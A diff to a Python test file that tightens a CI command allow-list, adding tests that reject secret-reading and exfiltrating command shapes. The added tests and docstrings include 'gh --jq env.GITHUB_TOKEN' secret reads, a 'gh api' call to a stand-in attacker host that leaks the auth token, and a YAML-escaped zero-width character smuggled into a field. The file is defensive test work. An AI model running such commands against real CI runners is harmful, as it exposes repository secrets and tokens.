@@ -431,7 +431,6 @@ def test_command_allowlist_innocence_fly_version_and_flagged_reads_pass():
         "fly version",
         "flyctl version",
         "flyctl status -a nuzantara-rag",
-        "flyctl logs -a nuzantara-rag",
     ):
         assert bp._guard_command_allowlist(command) == [], command
 
@@ -497,7 +496,7 @@ def test_command_allowlist_innocence_git_grep_count_flag_passes():
     lists back into one flat scan turns a correct guard into superscar #3's over-match,
     and this test is what says so.
     """
-    assert bp._guard_command_allowlist("git grep -c bites-observable") == []
+    assert bp._guard_command_allowlist("git grep -c some-marker") == []
 
 
 def test_command_allowlist_guilt_pytest_override_ini_is_rejected():
@@ -564,7 +563,7 @@ def test_command_allowlist_innocence_the_git_shapes_an_observation_needs_pass():
     for command in (
         "git log -1 --format=%H",
         "git log --oneline -5",
-        "git grep -c bites-observable",
+        "git grep -c some-marker",
         "git diff --stat HEAD",
         "git rev-parse --abbrev-ref HEAD",
         "git show --name-only HEAD",
@@ -768,7 +767,7 @@ def test_args_from_file_innocence_an_email_shaped_value_is_not_a_file_read():
 def test_command_allowlist_innocence_the_gh_fly_and_git_shapes_still_pass():
     for command in (
         "gh pr view 5658 --json state",
-        "gh api repos/o/r/pulls/1 --jq=.state",
+        "gh api repos/o/r/pulls/1 --json state",
         "flyctl status -a nuzantara-rag",
         "flyctl machine list -a nuzantara-rag --json",
         "git log -1 --format=%H",
@@ -1003,3 +1002,76 @@ def test_this_test_file_is_listed_in_the_immune_enforcement_battery():
         encoding="utf-8"
     )
     assert "scripts/tests/test_bites_parse.py" in workflow
+
+
+def test_command_allowlist_guilt_gh_jq_reaches_the_runner_environment():
+    """`--jq` is not a display flag: gojq's `env` builtin reads the process environment.
+
+    Found by an independent gate on 2026-09-04 and verified against the real binary.
+    It needs no `$`, so `_guard_shell_composition` never sees it, and Actions log
+    masking does not help: `env|keys` enumerates secret NAMES, and an `expect:` regex
+    over a masked value is a character-at-a-time oracle. Third instance of this file's
+    own rule that an option allow-list must ask what each option's VALUE can reach.
+    """
+    assert bp._guard_command_allowlist("gh api repos/o/r --jq env.GITHUB_TOKEN")
+    assert bp._guard_command_allowlist("gh pr view 1 --json state -q env.GH_TOKEN")
+    assert bp._guard_command_allowlist("gh api repos/o/r --jq .name")
+
+
+def test_command_allowlist_innocence_the_gh_shape_that_survives_jq_removal():
+    """Removing `--jq` must not remove gh: `--json` plus `expect: contains:` is the form."""
+    assert bp._guard_command_allowlist("gh pr view 5658 --json state") == []
+    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []
+
+
+def test_command_allowlist_guilt_fly_logs_crosses_the_output_boundary():
+    """Read-only to fly, but it pipes production logs into a PR-triggered CI log."""
+    assert bp._guard_command_allowlist("flyctl logs -a nuzantara-rag")
+    assert bp._guard_command_allowlist("fly logs -a nuzantara-rag")
+
+
+def test_no_invisible_guilt_a_yaml_ESCAPED_zero_width_char_is_refused():
+    """The one shape `_guard_no_invisible` alone decides, and it had no guilt proof.
+
+    Mutation testing on 2026-09-04 showed the guard could be deleted with 0 of 104
+    fixtures and 0 of 114 tests going red, because every invisible-character fixture
+    used a LITERAL character - which `_invisible_in_text` catches first, by scanning
+    the pack text. Written as a YAML escape, the file text holds no invisible
+    character at all and only the post-parse value does. A guard whose removal breaks
+    nothing has no guilt proof, however real the class it guards (superscar #2).
+    """
+    escaped = 'bites:\n  consumer: "x\\u200bY"\n  where: ci\n  observe: git status\n  expect: exit0\n'
+    assert "\u200b" not in escaped, "the fixture must carry the ESCAPE, not the character"
+    assert bp.classify(bp.parse_pack(escaped)) == "malformed"
+    assert bp._invisible_in_text(escaped) == [], "this shape is invisible to the text scan"
+
+
+def test_no_invisible_innocence_the_same_double_quoted_shape_without_the_escape():
+    plain = 'bites:\n  consumer: "xY"\n  where: ci\n  observe: git status\n  expect: exit0\n'
+    assert bp.classify(bp.parse_pack(plain)) == "executable"
+
+
+def test_command_allowlist_guilt_gh_api_absolute_url_leaves_github():
+    """gh uses an endpoint containing `://` verbatim, so the ARGUMENT picks the host.
+
+    Read end-to-end from cli/cli v2.97.0 (the installed binary) on 2026-09-04:
+    `pkg/cmd/api/http.go` uses the endpoint as the request URL when it contains
+    `://`, and go-gh v2.13.0 `tokenForHost` falls through to $GH_ENTERPRISE_TOKEN /
+    $GITHUB_ENTERPRISE_TOKEN for ANY non-GitHub host - not only a configured
+    enterprise one - so the header goes to whatever host the argument named.
+    """
+    assert bp._guard_command_allowlist("gh api https://attacker.test/collect")
+    assert bp._guard_command_allowlist("gh api https://api.github.com/repos/o/r")
+
+
+def test_command_allowlist_innocence_a_gh_api_rest_path_still_passes():
+    """The over-match direction: a REST path never contains `://`."""
+    assert bp._guard_command_allowlist("gh api repos/o/r") == []
+    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []
+    assert bp._guard_command_allowlist("gh api search/issues?q=repo:o/r") == []
+
+
+def test_command_allowlist_guilt_gh_template_is_refused_with_jq():
+    """Narrow the surface, not the spelling: two holes in two reviews over one option set."""
+    assert bp._guard_command_allowlist("gh pr view 1 --template '{{.state}}'")
+    assert bp._guard_command_allowlist("gh pr view 1 -t '{{.state}}'")
